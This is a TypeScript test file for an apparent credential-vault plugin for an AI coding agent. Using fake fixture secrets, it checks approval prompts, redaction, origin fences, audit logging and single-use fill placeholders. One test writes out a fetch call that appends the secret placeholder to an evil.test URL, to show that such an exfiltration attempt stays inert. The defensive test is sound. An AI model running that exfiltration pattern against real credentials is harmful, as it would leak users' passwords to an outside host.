// The provider layer end to end against the fixture `op`, `bw` and `security` CLIs of blindfold-providers. Every value is fake.
import { after, test } from "node:test"
import assert from "node:assert/strict"
import { mkdtempSync, readFileSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { Window } from "happy-dom"
import { Bitwarden } from "../../blindfold-providers/src/bitwarden.js"
import { memoryTokens } from "../../blindfold-providers/src/keychain.js"
import { OnePassword } from "../../blindfold-providers/src/onepassword.js"
import { registerProvider, type Account } from "../plugin/src/providers-contract"
import type { ToolContext } from "@opencode/plugin/promise/tool"
import { context, harness } from "./harness"
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms))

const root = new URL("../../blindfold-providers/", import.meta.url).pathname
const dir = mkdtempSync(join(tmpdir(), "bf-prov-"))
process.env.FIXTURE_STATE = join(dir, "fixture")
process.env.XDG_DATA_HOME = join(dir, "data")
after(() => rmSync(dir, { recursive: true, force: true }))

const SERVICE_TOKEN = "ops_fixture_service_token"
const BW = { method: "apiKey", clientId: "user.fixture-client", clientSecret: "fixture-client-secret", password: "fixture-bw-master" } as const
const VALUES = ["fixture-google-pw", "personal.fixture@example.test", "fixture-gwork-pw", "work.fixture@example.test", "fixture-holibob-pw", "fixture-gh-pw", SERVICE_TOKEN, "fixture-bw-master", "fixture-client-secret"]

let counter = 0
/** Accounts registered the way blindfold-providers does it; `stop` unregisters them and locks them. */
function providers(config: { workFence?: string[]; autoLockMinutes?: number; confirmEveryUse?: boolean } = {}) {
  const personal = new OnePassword({ id: "personal", label: "Personal (1Password)", bin: join(root, "fixture-cli/op"), tokens: memoryTokens(), confirmEveryUse: config.confirmEveryUse })
  const work = new Bitwarden({ id: "work", label: "Work (Bitwarden)", bin: join(root, "fixture-cli/bw"), appDataDir: join(dir, `bw-${++counter}`), organizationId: "org-work", allowedOrigins: config.workFence, autoLockMinutes: config.autoLockMinutes })
  const stops = [
    registerProvider({ kind: "1password", accepts: [1], source: "test", accounts: () => [personal as unknown as Account] }),
    registerProvider({ kind: "bitwarden", accepts: [1], source: "test", accounts: () => [work as unknown as Account] }),
  ]
  return {
    personal,
    work,
    unlockPersonal: () => personal.unlock({ method: "serviceAccount", token: SERVICE_TOKEN }),
    unlockWork: () => work.unlock(BW),
    stop: async () => {
      for (const stop of stops) stop()
      await personal.lock()
      await work.lock()
    },
  }
}

type Run = Awaited<ReturnType<typeof harness>>
const requests = (run: Run) => run.emitted.filter(([event]) => event === "requested").map(([, data]) => data as any)
const options = (extra: Record<string, unknown> = {}) => ({ audit: { file: join(dir, "audit.jsonl") }, ...extra })

/** Starts a call and waits for its card. */
async function opened(run: Run, tool: "get" | "fill", input: Record<string, unknown>, nth = 0) {
  const result = run.tools.get(tool)!.execute(input as never, context)
  let failed: unknown
  result.catch((error) => (failed = error))
  for (let i = 0; i < 400 && requests(run).length <= nth && !failed; i++) await sleep(10)
  if (failed) throw failed
  return { result, request: requests(run)[nth] }
}
const GOOGLE = { fields: [{ name: "EMAIL" }, { name: "PASSWORD" }], origin: "https://accounts.google.com", reason: "Sign in to Google" }
const noValue = (text: string) => VALUES.every((value) => !text.includes(value))

test("a login in one unlocked account: the card names the account and nothing is typed; Allow returns the values to the code only", async () => {
  const p = providers({ workFence: ["*.holibob.tech"] })
  try {
    await p.unlockPersonal()
    const run = await harness(options())
    const { result, request } = await opened(run, "get", GOOGLE)
    assert.equal(request.origin, "https://accounts.google.com")
    assert.deepEqual(request.fields.map((field: any) => [field.name, field.source.state, field.source.selected, field.source.candidates[0].label, field.source.candidates[0].state]), [
      ["EMAIL", "choose", "personal:vlt_agent/op1", "Personal (1Password)", "ready"],
      ["PASSWORD", "choose", "personal:vlt_agent/op1", "Personal (1Password)", "ready"],
    ])
    assert.ok(noValue(JSON.stringify(request)), "the request carries references only")
    assert.deepEqual(await run.handlers().submit({ requestID: request.requestID, values: {} }), { accepted: true })
    const done = (await result) as { output: Record<string, string> }
    assert.deepEqual(done.output, { EMAIL: "personal.fixture@example.test", PASSWORD: "fixture-google-pw" })
    assert.ok(noValue(JSON.stringify(run.emitted)), "no event carries a value")
    assert.equal(run.emitted.at(-1)![0], "resolved")
    // Redacted wherever it shows up, though never stored as a named secret.
    const shown = { tool: "shell", status: "completed", result: { content: "pw=fixture-google-pw mail=personal.fixture@example.test" } }
    await run.hooks.get("tool.execute.after")!(shown)
    assert.equal(shown.result.content, "pw=[REDACTED:PASSWORD] mail=[REDACTED:EMAIL]")
    const shell = { command: "echo $PASSWORD", env: {} as Record<string, string> }
    await run.hooks.get("shell.create.before")!(shell)
    assert.deepEqual(shell.env, {}, "a provider value is not offered to shell commands")
  } finally {
    await p.stop()
  }
})

test("a field the vault lacks for that site stays typed; an unknown site offers nothing", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const run = await harness(options())
    const { result, request } = await opened(run, "get", { fields: [{ name: "PASSWORD" }, { name: "RECOVERY_PHRASE" }], origin: "https://accounts.google.com", reason: "x" })
    const [password, phrase] = request.fields
    assert.equal(password.source.state, "choose")
    assert.equal(phrase.source.state, "unavailable", "no such field on the login")
    assert.match(phrase.source.hint, /no RECOVERY_PHRASE/)
    // Accepting needs the typed value too.
    assert.deepEqual(await run.handlers().submit({ requestID: request.requestID, values: {} }), { accepted: false })
    assert.deepEqual(await run.handlers().submit({ requestID: request.requestID, values: { RECOVERY_PHRASE: "typed phrase here" } }), { accepted: true })
    assert.deepEqual((await result as { output: unknown }).output, { PASSWORD: "fixture-google-pw", RECOVERY_PHRASE: "typed phrase here" })

    const none = await opened(run, "get", { name: "PASSWORD", origin: "https://nowhere.example", reason: "x" }, 1)
    assert.equal(none.request.fields[0].source.state, "unavailable")
    assert.equal(none.request.fields[0].source.hint, "No login for this site in your vaults. Not searched, locked: Work (Bitwarden).")
    await run.handlers().cancel({ requestID: none.request.requestID })
    await assert.rejects(none.result, /declined to provide PASSWORD/, "no provider row: the old wording")
  } finally {
    await p.stop()
  }
})

test("two accounts hold the login: the user chooses, the card cannot be accepted without a choice, and Always allow remembers the account", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    await p.unlockWork()
    const run = await harness(options())
    const { result, request } = await opened(run, "get", { name: "PASSWORD", origin: "https://accounts.google.com", reason: "Sign in" })
    const source = request.fields[0].source
    assert.deepEqual(source.candidates.map((item: any) => item.label), ["Personal (1Password)", "Work (Bitwarden)"])
    assert.equal(source.selected, undefined)
    assert.deepEqual(await run.handlers().submit({ requestID: request.requestID, values: {} }), { accepted: false }, "choose first")
    assert.deepEqual(await run.handlers().submit({ requestID: request.requestID, values: {}, picks: { PASSWORD: "elsewhere" } }), { accepted: false })
    const work = source.candidates.find((item: any) => item.account === "work").key
    await run.handlers().submit({ requestID: request.requestID, values: {}, picks: { PASSWORD: work }, remember: true })
    assert.equal(((await result) as { output: string }).output, "fixture-gwork-pw")

    const overview = (await run.handlers().overview({})) as { rules: any[]; audit: any[] }
    assert.equal(overview.rules.length, 1)
    assert.deepEqual([overview.rules[0].origin, overview.rules[0].account, overview.rules[0].field, overview.rules[0].itemTitle], ["https://accounts.google.com", "work", "password", "Google (work)"])
    assert.ok(noValue(JSON.stringify(overview)))

    // The rule decides the account, and the card does not appear at all.
    const before = requests(run).length
    const again = (await run.tools.get("get")!.execute({ name: "PASSWORD", origin: "https://accounts.google.com" } as never, context)) as { output: string }
    assert.equal(again.output, "fixture-gwork-pw")
    assert.equal(requests(run).length, before, "silent under a saved rule")

    // Not covered: another field of the same site still asks.
    const other = await opened(run, "get", { name: "EMAIL", origin: "https://accounts.google.com", reason: "x" }, before)
    assert.equal(other.request.fields[0].source.candidates.length, 2)
    await run.handlers().cancel({ requestID: other.request.requestID })
    await assert.rejects(other.result, /denied access to EMAIL/)

    // Revoked: asks again.
    assert.deepEqual(await run.handlers().revoke({ id: overview.rules[0].id }), { accepted: true })
    assert.deepEqual(await run.handlers().revoke({ id: overview.rules[0].id }), { accepted: false })
    const asked = await opened(run, "get", { name: "PASSWORD", origin: "https://accounts.google.com" }, before + 1)
    assert.equal(asked.request.fields[0].source.selected, undefined)
    await run.handlers().cancel({ requestID: asked.request.requestID })
    await assert.rejects(asked.result, /denied/)
    assert.ok(noValue(JSON.stringify(run.emitted)))
  } finally {
    await p.stop()
  }
})

test("Deny returns a denial and never a value; the audit trail names the account, never a value", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const file = join(dir, "deny-audit.jsonl")
    const run = await harness(options({ audit: { file } }))
    const { result, request } = await opened(run, "get", GOOGLE)
    await run.handlers().cancel({ requestID: request.requestID })
    await assert.rejects(result, (error: Error) => error.message === "The user denied access to EMAIL, PASSWORD." && noValue(error.message))
    const allowed = await opened(run, "get", { name: "PASSWORD", origin: "https://accounts.google.com", reason: "x" }, 1)
    await run.handlers().submit({ requestID: allowed.request.requestID, values: {} })
    await allowed.result
    const read = () => readFileSync(file, "utf8").trim().split("\n")
    for (let i = 0; i < 100 && read().length < 3; i++) await sleep(30)
    const lines = read().map((line) => JSON.parse(line))
    assert.deepEqual(lines.map((line) => [line.outcome, line.account, line.accountLabel, line.name, line.field, line.origin, line.via]), [
      ["denied", "personal", "Personal (1Password)", "EMAIL", "username", "https://accounts.google.com", "get"],
      ["denied", "personal", "Personal (1Password)", "PASSWORD", "password", "https://accounts.google.com", "get"],
      ["allowed", "personal", "Personal (1Password)", "PASSWORD", "password", "https://accounts.google.com", "get"],
    ])
    assert.ok(noValue(readFileSync(file, "utf8")))
  } finally {
    await p.stop()
  }
})

test("a locked account: the card offers its unlock, a wrong password says why without echoing it, the right one updates the card", async () => {
  const p = providers({ workFence: ["*.holibob.tech"] })
  try {
    const run = await harness(options({ rules: [{ origin: "*.holibob.tech", account: "work" }] }))
    const { result, request } = await opened(run, "get", { fields: [{ name: "EMAIL" }, { name: "PASSWORD" }, { name: "OTP", kind: "otp" }], origin: "https://admin.holibob.tech", reason: "Log in to Holibob admin" })
    const source = request.fields[1].source
    assert.deepEqual(source.candidates, [{ key: "work", account: "work", label: "Work (Bitwarden)", state: "locked", methods: ["apiKey"], covered: false }])
    assert.equal(source.selected, "work")
    assert.deepEqual(await run.handlers().submit({ requestID: request.requestID, values: {} }), { accepted: false }, "locked: cannot approve")
    assert.deepEqual(await run.handlers().unlock({ requestID: request.requestID, account: "personal", input: { method: "serviceAccount", token: SERVICE_TOKEN } }), { accepted: false }, "only accounts the card offers")

    const wrong = (await run.handlers().unlock({ requestID: request.requestID, account: "work", input: { ...BW, password: "wrong-master-12" } })) as { accepted: boolean; error: string }
    assert.equal(wrong.accepted, true)
    assert.match(wrong.error, /Invalid master password/)
    assert.ok(!wrong.error.includes("wrong-master-12"))

    const right = await run.handlers().unlock({ requestID: request.requestID, account: "work", input: BW })
    assert.deepEqual(right, { accepted: true })
    const updated = run.emitted.find(([event]) => event === "updated")![1] as any
    assert.equal(updated.requestID, request.requestID)
    assert.deepEqual(updated.fields.map((field: any) => [field.name, field.source.candidates[0].state, field.source.candidates[0].item.title]), [["EMAIL", "ready", "Holibob admin"], ["PASSWORD", "ready", "Holibob admin"], ["OTP", "ready", "Holibob admin"]])
    assert.ok(noValue(JSON.stringify(run.emitted)))
    const listed = (await run.handlers().list({})) as { requests: any[] }
    assert.equal(listed.requests[0].fields[0].source.candidates[0].state, "ready", "a reloaded window sees the unlocked card")

    await run.handlers().submit({ requestID: request.requestID, values: {} })
    const done = (await result) as { output: Record<string, string> }
    assert.deepEqual([done.output.EMAIL, done.output.PASSWORD], ["work.fixture@holibob.test", "fixture-holibob-pw"])
    assert.match(done.output.OTP, /^\d{6}$/)
    // A one-time code is read on use and never kept.
    const next = await opened(run, "get", { name: "OTP", kind: "otp", origin: "https://admin.holibob.tech", reason: "again" }, 1)
    await run.handlers().submit({ requestID: next.request.requestID, values: {} })
    assert.match(((await next.result) as { output: string }).output, /^\d{6}$/)
  } finally {
    await p.stop()
  }
})

test("a locked account under an Always allow rule: unlocking is the only step; the card then completes by itself", async () => {
  const p = providers()
  try {
    await p.unlockWork()
    const run = await harness(options({ rules: [{ origin: "admin.holibob.tech", account: "work" }] }))
    const first = await opened(run, "get", { name: "PASSWORD", origin: "https://admin.holibob.tech", reason: "x" })
    await run.handlers().submit({ requestID: first.request.requestID, values: {}, remember: true })
    await first.result
    await p.work.lock()

    const second = await opened(run, "get", { name: "PASSWORD", origin: "https://admin.holibob.tech", reason: "x" }, 1)
    assert.equal(second.request.fields[0].source.candidates[0].state, "locked")
    await run.handlers().unlock({ requestID: second.request.requestID, account: "work", input: { method: "masterPassword", password: "fixture-bw-master" } })
    assert.equal(((await second.result) as { output: string }).output, "fixture-holibob-pw", "no click needed after unlocking")
  } finally {
    await p.stop()
  }
})

test("work stays inside its fence: a fenced account is not offered for another site, and rules narrow the choice", async () => {
  const p = providers({ workFence: ["*.holibob.tech"] })
  try {
    await p.unlockPersonal()
    await p.unlockWork()
    const run = await harness(options())
    const google = await opened(run, "get", { name: "PASSWORD", origin: "https://accounts.google.com", reason: "x" })
    assert.deepEqual(google.request.fields[0].source.candidates.map((item: any) => item.account), ["personal"], "the work login for Google is not offered")
    await run.handlers().cancel({ requestID: google.request.requestID })
    await google.result.catch(() => undefined)

    const unfenced = providers()
    await unfenced.unlockWork()
    const ruled = await harness(options({ rules: [{ origin: "accounts.google.com", account: ["personal"] }] }))
    const asked = await opened(ruled, "get", { name: "PASSWORD", origin: "https://accounts.google.com", reason: "x" })
    assert.deepEqual(asked.request.fields[0].source.candidates.map((item: any) => item.account), ["personal"], "the rule names personal only")
    await ruled.handlers().cancel({ requestID: asked.request.requestID })
    await asked.result.catch(() => undefined)
    await unfenced.stop()
  } finally {
    await p.stop()
  }
})

test("an account set to confirm every use: no Always allow is offered, a submitted one saves nothing, and the next use asks again", async () => {
  const p = providers({ confirmEveryUse: true })
  try {
    await p.unlockPersonal()
    const run = await harness(options())
    const first = await opened(run, "get", { name: "PASSWORD", origin: "https://github.com", reason: "x" })
    assert.equal(first.request.fields[0].source.candidates[0].confirm, true, "the card hides Always allow for it")
    await run.handlers().submit({ requestID: first.request.requestID, values: {}, remember: true })
    await first.result
    assert.deepEqual(((await run.handlers().overview({})) as { rules: unknown[] }).rules, [], "nothing saved")
    const second = await opened(run, "get", { name: "PASSWORD", origin: "https://github.com", reason: "x" }, 1)
    assert.equal(second.request.fields[0].source.candidates[0].covered, false)
    await run.handlers().submit({ requestID: second.request.requestID, values: {} })
    await second.result
  } finally {
    await p.stop()
  }
})

test("Always allow on a fill does not make a get silent; the other way round it does", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const run = await harness(options())
    const filled = await opened(run, "fill", { tabID: "tab_1", origin: "https://github.com", fields: [{ name: "PASSWORD" }], reason: "x" })
    await run.handlers().submit({ requestID: filled.request.requestID, values: {}, remember: true })
    await filled.result
    const rules = ((await run.handlers().overview({})) as { rules: any[] }).rules
    assert.deepEqual(rules.map((rule) => rule.via), ["fill"])
    // The same site and field through get: the value would reach the agent's code, so it asks.
    const get = await opened(run, "get", { name: "PASSWORD", origin: "https://github.com", reason: "x" }, 1)
    assert.equal(get.request.fields[0].source.candidates[0].covered, false)
    await run.handlers().submit({ requestID: get.request.requestID, values: {}, remember: true })
    await get.result
    // Now a get rule exists too, and it covers a fill.
    const before = requests(run).length
    const again = (await run.tools.get("fill")!.execute({ tabID: "tab_1", origin: "https://github.com", fields: [{ name: "PASSWORD" }] } as never, context)) as { output: { script: string } }
    assert.match(again.output.script, /blindfold:fill/)
    assert.equal(requests(run).length, before, "silent")
  } finally {
    await p.stop()
  }
})

test("a name rule maps GITHUB_TOKEN to a vault reference; approved once, shell commands can name it like a configured secret", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const run = await harness(options({ rules: [{ name: "GH_PASSWORD", account: "personal", ref: "op://Agent/GitHub/password" }] }))
    const { result, request } = await opened(run, "get", { name: "GH_PASSWORD", reason: "gh" })
    assert.equal(request.fields[0].source.candidates[0].item.title, "Agent/GitHub")
    assert.equal(request.origin, undefined)
    await run.handlers().submit({ requestID: request.requestID, values: {}, remember: true })
    assert.equal(((await result) as { output: string }).output, "fixture-gh-pw")
    const shell = { command: 'GH_TOKEN="$GH_PASSWORD" gh api user', env: {} as Record<string, string> }
    await run.hooks.get("shell.create.before")!(shell)
    assert.deepEqual(shell.env, { GH_PASSWORD: "fixture-gh-pw" })
    const again = (await run.tools.get("get")!.execute({ name: "GH_PASSWORD" } as never, context)) as { output: string }
    assert.equal(again.output, "fixture-gh-pw")
    assert.equal(requests(run).length, 1, "stored for the session, as a configured secret is")
    const rule = ((await run.handlers().overview({})) as { rules: any[] }).rules[0]
    assert.deepEqual([rule.name, rule.origin, rule.account, rule.field], ["GH_PASSWORD", undefined, "personal", "password"])
  } finally {
    await p.stop()
  }
})

test("saved rules persist in the plugin's storage across a restart, and hold no value", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const memory = new Map<string, unknown>()
    const storage = { get: async (key: string) => memory.get(key), set: async (key: string, value: unknown) => void memory.set(key, value) }
    const first = await harness(options(), storage)
    const one = await opened(first, "get", { name: "PASSWORD", origin: "https://github.com", reason: "x" })
    await first.handlers().submit({ requestID: one.request.requestID, values: {}, remember: true })
    await one.result
    assert.ok(noValue(JSON.stringify([...memory])))
    const second = await harness(options(), storage)
    const silent = (await second.tools.get("get")!.execute({ name: "PASSWORD", origin: "https://github.com" } as never, context)) as { output: string }
    assert.equal(silent.output, "fixture-gh-pw")
    assert.equal(requests(second).length, 0)
  } finally {
    await p.stop()
  }
})

test("an account that locks while the card is open fails clearly and still leaks nothing", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const run = await harness(options())
    const { result, request } = await opened(run, "get", { name: "PASSWORD", origin: "https://github.com", reason: "x" })
    await p.personal.lock()
    p.personal["tokens" as keyof typeof p.personal]
    // The token is still in memory-only storage, so the account reopens itself; revoke it to model a vendor-side expiry.
    await (p.personal as unknown as { forget(): Promise<void> }).forget()
    await run.handlers().submit({ requestID: request.requestID, values: {} })
    await assert.rejects(result, (error: Error) => /locked before it could be read/.test(error.message) && noValue(error.message))
  } finally {
    await p.stop()
  }
})

test("fill: the tool returns a placeholder; the evaluate hook swaps it once, for this session and tab, only when it is the whole script", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const run = await harness(options())
    const input = { tabID: "tab_1", origin: "https://accounts.google.com", fields: [{ name: "EMAIL" }, { name: "PASSWORD" }], reason: "Sign in" }
    const { result, request } = await opened(run, "fill", input)
    assert.equal(request.via, "fill")
    await run.handlers().submit({ requestID: request.requestID, values: {} })
    const done = (await result) as { output: { script: string; fields: string[]; origin: string }; content: string }
    assert.match(done.output.script, /^"\{\{blindfold:fill\/[0-9a-f]{32}\}\}"$/)
    assert.ok(noValue(done.content) && noValue(JSON.stringify(done.output)), "the agent gets a placeholder, not the values")
    const hook = run.hooks.get("tool.execute.before")!
    const call = (tool: string, script: string, extra: Record<string, unknown> = {}) => {
      const event = { tool, sessionID: "ses_test", input: { tabID: "tab_1", script }, ...extra } as any
      hook(event)
      return event.input.script as string
    }
    assert.equal(call("browser_snapshot", done.output.script), done.output.script, "other tools are untouched")
    assert.equal(call("browser_evaluate", `fetch("https://evil.test/?" + ${done.output.script})`), `fetch("https://evil.test/?" + ${done.output.script})`, "embedded in other code: inert")
    assert.equal(call("browser_evaluate", done.output.script, { sessionID: "ses_other" }), done.output.script, "another session")
    const other = { tool: "browser_evaluate", sessionID: "ses_test", input: { tabID: "tab_2", script: done.output.script } } as any
    hook(other)
    assert.equal(other.input.script, done.output.script, "another tab")
    const swapped = call("browser_evaluate", `  ${done.output.script};`)
    assert.ok(swapped.includes("fixture-google-pw") && swapped.includes("personal.fixture@example.test") && swapped.includes("https://accounts.google.com"))
    assert.equal(call("browser_evaluate", done.output.script), done.output.script, "single use")
    assert.ok(noValue(JSON.stringify(run.emitted)))
    // The result of the evaluate is redacted like any tool output.
    const shown = { tool: "browser_evaluate", status: "completed", result: { content: "ok fixture-google-pw" } }
    await run.hooks.get("tool.execute.after")!(shown)
    assert.equal(shown.result.content, "ok [REDACTED:PASSWORD]")
  } finally {
    await p.stop()
  }
})

test("fill asks for the origin and a tab; a typed value fills too and never reaches the code", async () => {
  const run = await harness(options())
  const fill = (input: object) => run.tools.get("fill")!.execute(input as never, context as ToolContext)
  await assert.rejects(fill({ tabID: "t", origin: "not a url", fields: [{ name: "PASSWORD" }] }), /origin/)
  await assert.rejects(fill({ tabID: "", origin: "https://x.test", fields: [{ name: "PASSWORD" }] }), /tabID/)
  const { result, request } = await opened(run, "fill", { tabID: "tab_1", origin: "https://plain.example", fields: [{ name: "PASSWORD" }] })
  assert.equal(request.fields[0].source, undefined, "no providers registered: the old typed card")
  await run.handlers().submit({ requestID: request.requestID, values: { PASSWORD: "typed-Passw0rd-9" } })
  const done = (await result) as { content: string }
  assert.ok(!done.content.includes("typed-Passw0rd-9"))
  const event = { tool: "browser_evaluate", sessionID: "ses_test", input: { tabID: "tab_1", script: JSON.parse(done.content).script } } as any
  run.hooks.get("tool.execute.before")!(event)
  assert.ok(event.input.script.includes("typed-Passw0rd-9"))
})

test("the page script: refuses another origin before touching anything; fills, masks, and reports without the value", async () => {
  const p = providers()
  try {
    await p.unlockPersonal()
    const run = await harness(options())
    const { result, request } = await opened(run, "fill", { tabID: "tab_1", origin: "https://accounts.google.com", fields: [{ name: "EMAIL" }, { name: "PASSWORD" }] })
    await run.handlers().submit({ requestID: request.requestID, values: {} })
    const script = JSON.parse(((await result) as { content: string }).content).script as string
    const swap = () => {
      const event = { tool: "browser_evaluate", sessionID: "ses_test", input: { tabID: "tab_1", script } } as any
      run.hooks.get("tool.execute.before")!(event)
      return event.input.script as string
    }
    const real = swap()
    const page = (url: string) => {
      const window = new Window({ url })
      window.document.body.innerHTML = '<form><label for="e">Email or phone</label><input id="e" type="email" autocomplete="username"><input id="p" type="password"></form><p id="echo"></p>'
      const proto = window.HTMLElement.prototype as unknown as { getBoundingClientRect: () => object }
      proto.getBoundingClientRect = () => ({ width: 200, height: 30 })
      return window
    }
    const wrong = page("https://evil.example/login")
    const refused = wrong.eval(real) as { ok: boolean; fields: { reason: string }[] }
    assert.equal(JSON.stringify([refused.ok, refused.fields.map((field) => field.reason)]), JSON.stringify([false, ["origin", "origin"]]))
    assert.equal((wrong.document.getElementById("p") as any).value, "", "nothing was written")
    assert.ok(noValue(JSON.stringify(refused)))

    const right = page("https://accounts.google.com/signin")
    const report = right.eval(real) as { ok: boolean; fields: { ok: boolean; synced: boolean }[] }
    assert.equal(report.ok, true)
    assert.equal(JSON.stringify(report.fields.map((field) => field.synced)), "[true,true]")
    assert.equal((right.document.getElementById("p") as any).value, "fixture-google-pw")
    assert.equal((right.document.getElementById("e") as any).value, "personal.fixture@example.test")
    assert.equal(right.document.getElementById("p")!.getAttribute("data-blindfold-masked"), "PASSWORD")
    assert.ok(noValue(JSON.stringify(report)), "the report carries no value")
    right.document.getElementById("echo")!.textContent = "Signing in as personal.fixture@example.test"
    await sleep(30)
    assert.equal(right.document.getElementById("echo")!.getAttribute("data-blindfold-masked"), "EMAIL", "an echo of the value is masked")
    right.close()
    wrong.close()
  } finally {
    await p.stop()
  }
})
